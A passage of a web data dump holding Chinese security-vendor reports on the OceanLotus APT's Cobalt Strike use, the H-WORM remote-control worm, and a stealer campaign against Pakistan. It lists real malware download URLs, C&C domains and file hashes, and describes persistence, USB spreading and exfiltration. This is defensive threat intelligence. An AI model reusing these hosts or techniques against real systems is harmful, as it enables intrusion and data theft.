data-line="118">不管如何，我们的小王点击执行了那个诱饵程序，他的电脑已经默默地连接到了海莲花团伙的控制端，对方看到的操作界面应该是这样的：</p>\n<p class="text-center line" data-line="120"><img src="/uploads/2017/07/25/6ad375787b1299aad49b9e02c5f350f4.png" alt="" width="90%"></p>\n<p class="line" data-line="122">框架支持木马数据交互走HTTP、HTTPS、DNS和SMB隧道协议，当前攻击所用到的beacon.dll就支持beacon_http、beacon_dns、beacon_https和beacon_smb这些监听方式：</p>\n<p class="text-center line" data-line="124"><img src="/uploads/2017/07/25/df8a6ba68b527f4aae873312bfec95ea.png" alt=""></p>\n<p class="line" data-line="126">框架支持多种类型的攻击荷载生成：</p>\n<p class="text-center line" data-line="128"><img src="/uploads/2017/07/25/1e38f4145d1851d59e9af561d4d6585a.png" alt=""></p>\n<p class="line" data-line="130">由于能够轻松绕过现有的病毒查杀工具，基于Powershell的后门木马大受欢迎，Cobalt Strike的PayLoad Generator功能就支持这个选项：</p>\n<p class="text-center line" data-line="132"><img src="/uploads/2017/07/25/a78b325dd3e2b97ac9d192bd64bc2e35.png" alt=""></p>\n<p class="line" data-line="134">攻击框架生成的payload.ps1脚本与我们在这回的攻击中看到的logo.png文件大小存在很大差距：</p>\n<p class="text-center line" data-line="136"><img src="/uploads/2017/07/25/ac654174ac59b5ef1da30e8acfed6cdb.png" alt=""></p>\n<p class="line" data-line="138">区别就在var_code变量的内容：</p>\n<p class="text-center line" data-line="140"><img src="/uploads/2017/07/25/ea56222f61b8fdb83640f89888550b78.png" alt="" width="90%"></p>\n<p class="line" data-line="142">框架产出的payload.ps1脚本中Shellcode功能比较简单，从中可以提取出下载的url地址为：http://*<em><em>.</em>.</em>.***:808/vQEV，从该网址下载下个阶段的Shellcode执行，如图：</p>\n<p class="text-center line" data-line="144"><img src="/uploads/2017/07/25/7201b2f9f368968f00d8668d88b3156b.png" alt="" width="90%"></p>\n<p class="line" data-line="146">下载回来的数据大小为186KB：</p>\n<p class="text-center line" data-line="148"><img src="/uploads/2017/07/25/7589a3418d5272755603f43c3c1191ea.png" alt="" width="90%"></p>\n<p class="line" data-line="150">下载回来的代码除了后面的加密后的数据段不一样，Shellcode和海莲花团伙的Shellcode的代码是一样的，如图为攻击框架下载回来的vQEV模块的解密代码：</p>\n<p class="text-center line" data-line="152"><img src="/uploads/2017/07/25/7c343eb6e6be76c4dd3535523b849e6d.png" alt="" width="90%"></p>\n<p class="line" data-line="154">而海莲花的这个名为logo.png的Powershell脚本则直接把需要下载回来的这块代码嵌入到var_code变量中直接执行而不是从网上下载，虽然增大了文件，但减少了由于网络和服务的问题可能导致的下载失败。</p>\n<h3 class="line" data-line="156">横向移动</h3>\n<p class="line" data-line="158">控制了小王的电脑，在单位里建立了立足点，海莲花团伙开始使用Cobalt Strike在内网里横向移动。Cobalt Strike框架不仅用来构造初始入侵的Payload投递工具，在获取内网节点的控制以后自动化地扫描发现内网系统各类漏洞及配置问题加以利用以扩大战果，比如我们看到控制者往小王的机器上传了用于扫描SMB服务工具nbtscan.exe，然后立即运行起来对内网进行扫描。</p>\n<p class="line" data-line="160">一天以后，内网中的另外几台机器被攻陷，因为受感染机器发出了对外的C&amp;C的连接。其中包括了一台内网办公用服务器，接着我们又看到了非常熟悉的手法：服务器中的两个重要可执行文件被绑上了木马程序，同时提供假的Flash升级包并在用户访问的时候提示下载，这样就把服务器变成了水坑。</p>\n<p class="line" data-line="162">以后的几天，我们陆续发现内网中其他几台客户端通过访问这个服务器系统下载执行木马而被感染，因为网络中的天眼系统看到了其对外发出的C&amp;C连接。在安装了天擎终端安全产品的客户端在执行下载回来的木马时，虽然做了免杀处理，但基于天眼网络层的威胁情报联动，天擎的终端检测与防御（EDR）机制则会立即在相应的终端对恶意代码做查杀，使攻击者完成的初始控制马上失效。</p>\n<p class="line" data-line="164">总结起来，对于我们观察到的这次攻击，整体的过程情况可以用如下的图来表示：</p>\n<p class="text-center line" data-line="166"><img src="/uploads/2017/07/25/0abfd0f1ab19368980afa713fc1ee101.png" alt="" width="90%"></p>\n<h2 class="line" data-line="168">观察与结论</h2>\n<p class="line" data-line="170">从360天眼实验室对大网感染情况的监测，自从去年被我们公开揭露出来以后，只在其后的小一段时间有所沉寂，在确认没有进一步人身威胁以后，海莲花团伙的活动依旧猖獗，甚至超过以往。</p>\n<p class="line" data-line="172">总体来看，攻击手法上并没有什么变化，但是可以看到的是，由于Powershell的有效性，APT团伙（或者黑客组织）对其越来越青睐，正如上面的案例所分析的，从初始入侵payload的构建，到后续内网横向移动等一系列行为中，powershell都被积极地使用，而事实也证明了这样的手段非常有效。</p>\n<p class="line" data-line="174">以下是海莲花团伙在Lockheed Martin Cyber Kill Chain各环节上特征描述：</p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>攻击阶段</strong></td>\n<td><strong>特性描述</strong></td>\n</tr>\n<tr>\n<td><strong>侦察跟踪</strong></td>\n<td>关注目标（主要是政府和海事相关）网站，尝试入侵，收集相关的电子邮箱</td>\n</tr>\n<tr>\n<td><strong>武器构建</strong></td>\n<td>使用多种现成的技术生成绑定木马诱饵程序，当前采用Powershell的Payload非常普遍</td>\n</tr>\n<tr>\n<td><strong>载荷投递</strong></td>\n<td>入侵网站构建水坑、发送定向鱼叉邮件</td>\n</tr>\n<tr>\n<td><strong>突防利用</strong></td>\n<td>利用似乎工作相关的内容进行社工诱导点击执行诱饵程序</td>\n</tr>\n<tr>\n<td><strong>安装植入</strong></td>\n<td>下载第二阶段Shellcode完成控制，以计划任务方式达成持久化</td>\n</tr>\n<tr>\n<td><strong>通信控制</strong></td>\n<td>之前使用自有实现的通信协议，当前较多地使用商业化攻击框架Cobalt Strike</td>\n</tr>\n<tr>\n<td><strong>达成目标</strong></td>\n<td>使用Cobalt Strike进行集成化的自动渗透，不太在乎隐秘性，只要有可能进一步创建更多水坑</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="189">随着基于天眼和天擎产品在用户环境中部署量的增加，我们看到越来越多的实际攻击案例，网络与终端结合的数据赋予的Visibility让我们对海莲花团伙的TTP（Tactics、Techniques、Procedures）有了更贴近的观察和分析。天眼设备强大的网络层数据记录和还原的能力使我们能够监测到载荷投递、通信控制及数据泄出阶段的迹象，天擎在终端的行为记录能力则有可能让我们看到恶意代码的突破常规防御机制实现持久化植入的活动。</p>\n<p class="line" data-line="191">对于APT攻击的防御需要综合性的多层次的方案，没有什么单点的银弹解决方案，包括现在很火的威胁情报。在我们所能观察到所有层面部署记录和监测机制，选用合适的数据分析方法才有可能发现并关联线索，发现攻击，评估损失，尽可能减小暴露在威胁下的时间。</p>\n',category:"专题报告",__v:2,abstract:"APT相关的活动事实上是情报战在网络空间的延伸，其中很大部分属于国家级的对抗，我们的攻击者很多在国门之外，对其的打击已超出了相对简单的技术对抗的范畴。而如果不能从组织和人员的层面上解决问题，那么公开的揭露只会促使其采用的新攻击方式的缓解措施而已，过不多久攻击就会改头换面卷土重来。现实验证了我们的推断，从天眼实验室跟踪的多个APT团伙及其活动来看，从未有什么团伙在被揭露以后而全面停止活动的，从未。在发布海莲花报告一年多的今天，我们也一直在持续监测着海莲花团伙的活动，从未间断，而更多监控能力的引入使我们把对手的活动看得更清晰。最近的大网数据显示在4月份就发生了数百例新的感染，威胁丝毫没有出现缓解的迹象，本文会通过介绍一个真实的案例来展现相关的细节。",modify_time:"2017-08-01T08:12:32.398Z",readableId:"resurface-of-oceanlotus",publish_time:"2016-07-18T17:58:08.000Z",descImg:"/uploads/2017/08/01/02ab341818fe9bcd6efc88d8bcd65feb.png",insert_time:"2017-07-25T12:03:51.355Z",isDraft:!1,tags:["oceanlotus","海莲花","APT"]},{_id:"597733a71c670a09e493ee39",title:"H-WORM：简单而活跃的远控木马",author:"admin",content:'<h2 class="line" data-line="0">现象</h2>\n<p class="line" data-line="2">人在做，天在看。</p>\n<p class="line" data-line="4">远控类木马的活动一直是360天眼实验室的关注重点，近期我们的天眼设备发现了如下一组看起来非常眼熟的被访问的链接。URL的模式非常明显：免费动态域名+非知名的端口+“/is-ready” 。</p>\n<ul>\n<li>http://adolf2013.sytes.net:1183/is-ready</li>\n<li>http://herohero.no-ip.org:96/is-ready</li>\n<li>http://micr0s0ftsoft.myftp.org:82/is-ready</li>\n<li>http://dzhacker15.no-ip.org:100/is-ready</li>\n<li>http://blackmind.redirectme.net:820/is-ready</li>\n<li>http://aass.no-ip.biz:83/is-ready</li>\n<li>http://sidisalim.myvnc.com:1888/is-ready</li>\n<li>http://spy2010net.zapto.org:83/is-ready</li>\n<li>http://smoker21.hopto.org:1920/is-ready</li>\n</ul>\n<p class="line" data-line="16">查询360威胁情报中心，上面提及的这些域名关联到同一个IP地址：204.95.99.31 。</p>\n<p class="text-center line" data-line="18"><img src="/uploads/2017/07/25/04857b168375c864afae4632c21bb06c.png" alt="" width="90%"></p>\n<p class="line" data-line="20">而对IP 204.95.99.31查询情报中心的Passive DNS数据，我们可以发现其绑定过大量的恶意域名，从那些域名通过威胁情报中心又能很快关联相应的恶意样本。经过对得到的样本的分析，我们确认其中绝对大部分样本属于H-WORM恶意代码家族，此外还有一些诸如njRAT、 XtremeRAT、njW0rm等使用同一家族通信协议的RAT恶意样本。</p>\n<p class="text-center line" data-line="22"><img src="/uploads/2017/07/25/4d0745d79253e5ab053bcd6c5346513d.png" alt="" width="90%"></p>\n<p class="line" data-line="24">从我们对相关样本量的历史监测图来看，H-WORM在国内一直保有一定的活跃度，其实H-WORM是个非常简单的恶意代码，但在我们强大的病毒查杀体系下却能生存一下必定有它的原因，那么我们来了解一下这个叫做H-WORM的恶意程序。</p>\n<p class="text-center line" data-line="26"><img src="/uploads/2017/07/25/0e65bbb226798ef538cb0284cb45b86a.png" alt="" width="90%"></p>\n<h2 class="line" data-line="28">H-WORM</h2>\n<p class="line" data-line="30">H-WORM是个ID为Houdini的人写的一款用VBS实现远控蠕虫，能够通过感染U盘传播，出现的时间最早可以追溯到2013年7月。因为其简洁有效的远控功能、非PE脚本易于免杀、便于修改等特性，一直被黑产所青睐而活跃至今。</p>\n<p class="text-center line" data-line="32"><img src="/uploads/2017/07/25/708ff521e6d29c61b9c2a4932263e2f6.png" alt="" width="90%"></p>\n<p class="line" data-line="34">2013年7月24日，H-WORM的作者Houdini在某论坛上发布H-WORM的帖子</p>\n<p class="line" data-line="36">H-WORM样本的主要传播方式有三种：电子邮件附件、恶意链接和被感染的U盘传播，蠕虫式的传播机制会形成大量的感染。 下面为作者公开提供下载的H-WORM控制端截图，下载地址见文后的参考链接：</p>\n<p class="text-center line" data-line="38"><img src="/uploads/2017/07/25/82abdb75d4d8cc27304f5d1519e00026.png" alt="" width="90%"></p>\n<h2 class="line" data-line="40">样本分析</h2>\n<p class="line" data-line="42">代码简洁而有效是H-WORM最大的特点。这里我们对选取其中一个H-WORM样本做一下简单分析，看看H-WORM感染受害者计算机后到底做了些什么，普通用户又该怎样采取应对措施。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>样本HASH</strong></td>\n<td>1eb712d4976babf7c8cd0b34015c2701bc5040420e688911e6614b278cc82a42</td>\n</tr>\n<tr>\n<td><strong>样本名称</strong></td>\n<td>F:\\cwtslatwbl.vbs</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="49">将样本代码简单解密后，得到真正的代码。解密方式为将“81899982838”替换为空格，然后取每个数值对应的ASCII字符即可。</p>\n<p class="text-center line" data-line="51"><img src="/uploads/2017/07/25/9e1b758c4eaec8de0fa7b7b455c4eadc.png" alt="" width="90%"></p>\n<p class="line" data-line="53">样本首先通过读取注册表HKEY_LOCAL_MACHINE\\software\\脚本名  项来判断当前系统是否已经感染，如未感染，则写入该项。然后通过写入注册表项HKCU\\Software\\microsoft\\CurrentVersion\\Run和HKLM\\Software\\microsoft\\CurrentVersion\\Run来实现开机自启动，并将自身拷贝到temp目录和Startup目录下：</p>\n<p class="text-center line" data-line="55"><img src="/uploads/2017/07/25/f706673d28290bc00bb8d122ecc5119a.png" alt="" width="90%"></p>\n<p class="line" data-line="57">接着，进入主循环，H-WORM会不断循环遍历系统驱动器判断是否有可移动磁盘接入，如果有，则将自身拷贝到可移动磁盘内设置文件属性为隐藏、系统文件。同时将除了.lnk文件外的其他文件隐藏，然后创建其快捷方式，快捷方式的参数则设置为用cmd调用自身，然后再打开原始文件以迷惑用户，这是极其常见而又非常有效的通过移动介质进行传播的方式。相关的代码如下：</p>\n<p class="text-center line" data-line="59"><img src="/uploads/2017/07/25/311c195e1fad5a94de50003e13bc6723.png" alt="" width="90%"></p>\n<p class="line" data-line="61">之后开始连接远程服务器，通过HTTP请求向服务器发送用户信息，其收集的用户信息包括computername、username、操作系统版本、杀软信息等等。接着开始接收服务器命令，主要功能有文件管理、进程管理、远程shell、执行远程代码等等，值得一提的是样本使用了User-Agent来传递数据：</p>\n<p class="text-center line" data-line="63"><img src="/uploads/2017/07/25/c535ad61a4dbfbc048327c32fecb128f.png" alt=""></p>\n<p class="text-center line" data-line="65"><img src="/uploads/2017/07/25/7593c93c91c829f2ed692afa08397ae8.png" alt="" width="90%"></p>\n<p class="line" data-line="67">接收命令和对应功能如下图，命令格式为 command &lt;|&gt; param，通过&lt;|&gt;分割命令和参数。</p>\n<p class="text-center line" data-line="69"><img src="/uploads/2017/07/25/e50775a1f7e8e4406bdcfacef42c09da.png" alt="" width="90%"></p>\n<p class="line" data-line="71">受害者的计算机感染H-WORM之后，攻击者可以进一步地推送其他恶意程序，使其被彻底控制，或者使其成为僵尸网络的一部分。</p>\n<h2 class="line" data-line="73">感染情况</h2>\n<p class="line" data-line="75">通过360威胁情报中心的数据，我们估计了最近一个月的H-WORM的感染量，感染的计算机超过6000台。从地域来看，感染影响32个省份和直辖市，其中陕西省和吉林省的受害者最多，占总数的10%和9%；其次是河南、天津，比例均超过7%；然后是四川、广东、江苏、福建、山东、云南等，占比也超过5%。这个分布状态与我们通常看到的与省份的发达程度成正比的恶意代码感染量并不一致，背后的原因也许值得挖掘。</p>\n<p class="text-center line" data-line="77"><img src="/uploads/2017/07/25/f1adeb56753df20fe59dc6b69f1038cf.png" alt="" width="90%"></p>\n<h2 class="line" data-line="79">IOC</h2>\n<p class="line" data-line="81">我们统计到的H-WORM样本涉及的C&amp;C地址共有173个，其中有126个域名可以观察到历史解析信息，截至最近抽样统计总共解析接近1000万次。</p>\n<p class="line" data-line="83">下表为目前比较活跃的其中50个域名，可以作为非常有效的IOC使用。全部已知的域名作为威胁情报已经推送到天眼设备，在部署了设备的网络可以快速发现被感染的系统。</p>\n<table>\n<thead>\n<tr>\n<th><strong>域名</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>zzzch.zapto.org</td>\n</tr>\n<tr>\n<td>ysf.no.ip.biz</td>\n</tr>\n<tr>\n<td>ycemufkk6g.bounceme.net</td>\n</tr>\n<tr>\n<td>xxx.xxx.no.ip.info</td>\n</tr>\n<tr>\n<td>xkiller.no.ip.info</td>\n</tr>\n<tr>\n<td>wach.no.ip.org</td>\n</tr>\n<tr>\n<td>tariqalr.zapto.org</td>\n</tr>\n<tr>\n<td>shagagy21.no.ip.biz</td>\n</tr>\n<tr>\n<td>sexcam.3utilities.com</td>\n</tr>\n<tr>\n<td>servecounterstrike.servecounterstrike.com</td>\n</tr>\n<tr>\n<td>playgame.servecounterstrike.com</td>\n</tr>\n<tr>\n<td>p.dark.zapto.org</td>\n</tr>\n<tr>\n<td>nouna1985.no.ip.org</td>\n</tr>\n<tr>\n<td>n0it.no.ip.org</td>\n</tr>\n<tr>\n<td>mzab47.myq.see.com</td>\n</tr>\n<tr>\n<td>modox.no.ip.org</td>\n</tr>\n<tr>\n<td>mmoohhaammeedd.no.ip.biz</td>\n</tr>\n<tr>\n<td>mlcrosoft.serveftp.com</td>\n</tr>\n<tr>\n<td>microsoftupgrades.servehttp.com</td>\n</tr>\n<tr>\n<td>microsoftsystem.sytes.net</td>\n</tr>\n<tr>\n<td>micr0s0ftsoft.myftp.org</td>\n</tr>\n<tr>\n<td>mda.no.ip.org</td>\n</tr>\n<tr>\n<td>maroco.redirectme.net</td>\n</tr>\n<tr>\n<td>maroco.myq.see.com</td>\n</tr>\n<tr>\n<td>maroco.linkpc.net</td>\n</tr>\n<tr>\n<td>man2010.no.ip.org</td>\n</tr>\n<tr>\n<td>korom.zapto.org</td>\n</tr>\n<tr>\n<td>koko.myftp.org</td>\n</tr>\n<tr>\n<td>klonkino.no.ip.org</td>\n</tr>\n<tr>\n<td>king.servemp3.com</td>\n</tr>\n<tr>\n<td>herohero.no.ip.org</td>\n</tr>\n<tr>\n<td>hacker20133.no.ip.org</td>\n</tr>\n<tr>\n<td>googlechrome.servequake.com</td>\n</tr>\n<tr>\n<td>g00gle.sytes.net</td>\n</tr>\n<tr>\n<td>dzhacker15.no.ip.org</td>\n</tr>\n<tr>\n<td>dz47.servehttp.com</td>\n</tr>\n<tr>\n<td>dz47.myq.see.com</td>\n</tr>\n<tr>\n<td>dz47.linkpc.net</td>\n</tr>\n<tr>\n<td>dream7.no.ip.biz</td>\n</tr>\n<tr>\n<td>diiimaria.zapto.org</td>\n</tr>\n<tr>\n<td>desha10.no.ip.org</td>\n</tr>\n<tr>\n<td>dataday3.no.ip.org</td>\n</tr>\n<tr>\n<td>darkanony0501.no.ip.biz</td>\n</tr>\n<tr>\n<td>cupidon.zapto.org</td>\n</tr>\n<tr>\n<td>chrom.no.ip.info</td>\n</tr>\n<tr>\n<td>bog5151.zapto.org</td>\n</tr>\n<tr>\n<td>blackmind.redirectme.net</td>\n</tr>\n<tr>\n<td>albertino.no.ip.info</td>\n</tr>\n<tr>\n<td>adolf2013.sytes.net</td>\n</tr>\n<tr>\n<td>adamdam.zapto.org</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="138">参考链接</h2>\n<p class="line" data-line="140"><a href="http://www.ic0de.org/archive/index.php/t-12134.html">http://www.ic0de.org/archive/index.php/t-12134.html</a></p>\n<p class="line" data-line="142"><a href="http://rghost.net/47560191">http://rghost.net/47560191</a></p>\n<p class="line" data-line="144"><a href="https://www.fireeye.com/blog/threat-research/2013/08/njw0rm-brother-from-the-same-mother.html">https://www.fireeye.com/blog/threat-research/2013/08/njw0rm-brother-from-the-same-mother.html</a></p>\n',category:"专题报告",__v:1,abstract:"远控类木马的活动一直是360天眼实验室的关注重点，近期我们的天眼设备发现了如下一组看起来非常眼熟的被访问的链接。URL的模式非常明显：免费动态域名+非知名的端口+“/is-ready” 。",modify_time:"2017-08-01T08:20:41.015Z",readableId:"hworm-malware",publish_time:"2016-07-10T12:40:52.000Z",descImg:"/uploads/2017/08/01/d989344e7ac3d3447ca4c4ff74ceb210.png",insert_time:"2017-07-25T12:03:51.300Z",isDraft:!1,tags:["HWorm"]},{_id:"597733a71c670a09e493ee3d",title:"针对巴基斯坦的某APT活动事件分析",author:"admin",content:'<h2 class="line" data-line="0">事件背景</h2>\n<p class="line" data-line="2">2017年6月， 360威胁情报中心发现了一份可疑的利用漏洞执行恶意代码的Word文档，经过分析后，我们发现这有可能是一起针对巴基斯坦的政府官员的APT攻击事件，释放出来的载荷会收集受害者的键盘记录和重要软件密码、文档等。本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。</p>\n<h2 class="line" data-line="4">样本分析</h2>\n<h3 class="line" data-line="6">漏洞利用Dropper</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>4f4cc89905bea999642a40d0590bdfa3</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>66Kb</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>peace-along-the-border-is-not-a-one-process-says-Lt-gen-ds-hooda.doc</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="17">该文档所利用的漏洞为CVE-2015-2545（关于该漏洞的分析已经有不少详细分析的资料，这里就不再赘述），当受害者点开该文档时，会加载EPS文件从而触发漏洞，这里攻击者使用的漏洞利用代码是已经在野外流传很久的成熟利用，这套利用的特点是通过shellcode注入explorer进程下载木马文件，但shellcode后附加一个DLL文件以利用CVE-2015-2546权限提升漏洞得到系统最高权限。</p>\n<p class="line" data-line="19">注入explorer.exe的代码如下：</p>\n<p class="text-center line" data-line="21"><img src="/uploads/2017/07/25/eb9521a61de45d6696701d74995cfc2f.png" alt="" width="90%"></p>\n<p class="line" data-line="23">explorer.exe中下载载荷的代码如下：可以看到下载地址为http://tes[.]sessions4life[.]pw/quiz/WelcomeScrn.exe</p>\n<p class="text-center line" data-line="25"><img src="/uploads/2017/07/25/b659e713974a2508b1eb331696921a64.png" alt="" width="90%"></p>\n<p class="line" data-line="27">CVE-2015-2546权限提升DLL部分代码：</p>\n<p class="text-center line" data-line="29"><img src="/uploads/2017/07/25/80a5702267f59cc449a8a99109decec5.png" alt="" width="90%"></p>\n<h3 class="line" data-line="31">WelcomeScrn.exe</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>feea1d90e77dff5ff9f896122cf768f6</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>PE可执行文件</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>124Kb</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>WelcomeScrn.exe</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="42">这是个downloader，功能非常简单，直接连接到内置网址http://185[.]109[.]144[.]102/DistBuild/DefenderReference.exe，下载并执行文件。</p>\n<p class="text-center line" data-line="44"><img src="/uploads/2017/07/25/289299000188e3e0f3367813412d3323.png" alt=""></p>\n<h3 class="line" data-line="46">DefenderReference.exe</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>c43bab60cbf7922a35979e4f41f9aa9e</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>PE可执行文件</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>747Kb</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>DefenderReference.exe</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="57">DefenderReference.exe通过HTTP协议与服务器通信的窃密木马，被执行起来后，会先完成一些初始化的工作，释放并加载WER167893459067.dll后创建以下目录：</p>\n<ul>\n<li>%Local%\\SharedFiles\\Log</li>\n<li>% Local %\\ SharedFiles \\Sys</li>\n<li>% Local %\\ SharedFiles \\Temp</li>\n<li>% Local %\\ SharedFiles \\WinAero</li>\n<li>% Local %\\ SharedFiles \\WinDataShots</li>\n<li>% Local %\\ SharedFiles \\WinInternetData</li>\n<li>% Local %\\ SharedFiles \\WinLog</li>\n<li>% Local %\\ SharedFiles \\WinRM</li>\n</ul>\n<p class="line" data-line="68">然后终止cmd.exe、PATHPING.EXE、TRACERT.EXE、net.exe、systeminfo.exe进程,并判断自身进程启动路径是否为% Local %\\ SharedFiles \\Sys，如果不是，则将自身拷贝到% Local %\\ SharedFiles \\Sys\\ DefenderReference.exe，释放MSOBuild.exe、AdminNewDll.dll、AdminServerDll.dll等文件，最后启动MSOBuild.exe</p>\n<p class="text-center line" data-line="70"><img src="/uploads/2017/07/25/67cfd127816a0b08e055a75b5f3749fb.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="72"><img src="/uploads/2017/07/25/f5fcabe462f04323612f741364ad9ee4.png" alt="" width="90%"></p>\n<h3 class="line" data-line="74">MSOBuild.exe</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>c5f76015b2cb15f59070d2e5cfdd8f6e</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>PE可执行文件</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>147Kb</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>MSOBuild.exe</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="85">这个文件其实还是个downloader，在初始化和检查执行环境（虚拟机、沙箱、调试）后，访问http://docs.google.com/uc?id=0Bx9cf6a5Mapaa3g4MlI4T244SlU&amp;export=download,获取C&amp;C的地址185.109.144.102</p>\n<p class="line" data-line="87">接着下载以下配置文件：</p>\n<ul>\n<li>hxxp://185[.]109.144.102/DistBuild/getAllFiles.php(指明需要下载的组件)</li>\n<li>http://185[.]109.144.102/DistBuild/getExecutables.php (指明要执行的组件)</li>\n<li>http://185[.]109.144.102/DistBuild/getExtensions_doc.php (指明关心的文档类型文件后缀名)</li>\n<li>http://185[.]109.144.102/DistBuild/ getExtensions_nondoc.php (指明关心的非文档文件类型)</li>\n<li>http://185[.]109.144.102/DistBuild/getExtensions_rmdrive.php (指明要执行的组件)</li>\n</ul>\n<p class="text-center line" data-line="95"><img src="/uploads/2017/07/25/a7cadc72c9ec9521e5aed7c0499ff14f.png" alt="" width="90%"></p>\n<p class="line" data-line="97">接着下载配置文件中指定的组件，再一一启动这些组件：</p>\n<p class="text-center line" data-line="99"><img src="/uploads/2017/07/25/57cc6ae8567dd473da18554bd80e7f87.png" alt="" width="90%"></p>\n<p class="line" data-line="101">下表是木马的各个组件信息：</p>\n<center><table>\n<thead>\n<tr>\n<th><strong>文件名</strong></th>\n<th><strong>备注</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>DefenderReference.exe</td>\n<td>Dropper</td>\n</tr>\n<tr>\n<td>MSOBuild.exe</td>\n<td>通过调用AdminServerDll.dll下载其他组件</td>\n</tr>\n<tr>\n<td>AdminServerDll.dll</td>\n<td>功能模块，每个导出函数对应一种功能</td>\n</tr>\n<tr>\n<td>AdminNewDll.dll</td>\n<td>检测到虚拟机\\沙箱时加载的无效dll</td>\n</tr>\n<tr>\n<td>PackageMSOffce.exe</td>\n<td>上传文档类型文件</td>\n</tr>\n<tr>\n<td>PlayMedia.exe</td>\n<td>上传非文档类型文件</td>\n</tr>\n<tr>\n<td>TimeSyncApp.exe</td>\n<td>发送受害者信息，等待指令</td>\n</tr>\n<tr>\n<td>FoldrOpt.exe</td>\n<td>设置启动项、检查环境、收集计算机信息</td>\n</tr>\n<tr>\n<td>OptimisedDisply.exe</td>\n<td>屏幕截图、上传截图</td>\n</tr>\n<tr>\n<td>LangEngUTF16.exe</td>\n<td>上传键盘记录</td>\n</tr>\n<tr>\n<td>LangEngUTF8.exe</td>\n<td>键盘记录</td>\n</tr>\n<tr>\n<td>InstntAccelx.exe</td>\n<td>检测U盘，自拷贝进行传播</td>\n</tr>\n<tr>\n<td>InstntAccelx.exe</td>\n<td>检测U盘，上传U盘内的文件</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="121">经过以上分析，我们发现这个木马家族有以下功能：上传/下载文件、执行指定文件、键盘记录、屏幕截图、感染U盘、发送感染电脑位置信息等，窃取的文件列表如下：</p>\n<ul>\n<li>.doc</li>\n<li>.docx</li>\n<li>.ppt</li>\n<li>.pps</li>\n<li>.pptx</li>\n<li>.ppsx</li>\n<li>.xls</li>\n<li>.xlsx</li>\n<li>.pdf</li>\n<li>.inp</li>\n<li>.vcf</li>\n<li>.txt</li>\n<li>.jpg</li>\n<li>.jpeg</li>\n<li>.bmp</li>\n<li>.gif</li>\n<li>.png</li>\n<li>.avi</li>\n<li>.wmv</li>\n<li>.mp4</li>\n<li>.mpg</li>\n<li>.mpeg</li>\n<li>.3gp</li>\n<li>.mp3</li>\n<li>.wav</li>\n</ul>\n<p class="line" data-line="149">并且该木马可以通过在线获取新插件的形式迅速方便地扩展更多的功能。木马的代码清晰、结构严谨，受控端通过HTTP请求与控制服务器通信，访问不同的php页面代表执行不同的功能，可能是高度定制的专用木马，或者是专门出售的商业间谍木马。</p>\n<p class="line" data-line="151">下面介绍该木马比较有特色的地方：</p>\n<ol>\n<li>不同的组件都通过调用同一个AdminServerDll.dll来完成具体功能，高度模块化。例如MSOBuild.exe和DefenderReference.exe中，分别获取AdminServerDll.dll的不同导出函数，然后调用这些导出函数，程序里只有基本的逻辑而没有具体的功能实现，下面左边是MSOBuild.exe,右边是DefenderReference.exe</li>\n</ol>\n<p class="text-center line" data-line="155"><img src="/uploads/2017/07/25/95424d612fcb7769b0291f79a5969a56.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="157"><img src="/uploads/2017/07/25/cf66e0663f24d7def1df2cdca3b1a9a0.png" alt="" width="90%"></p>\n<p class="line" 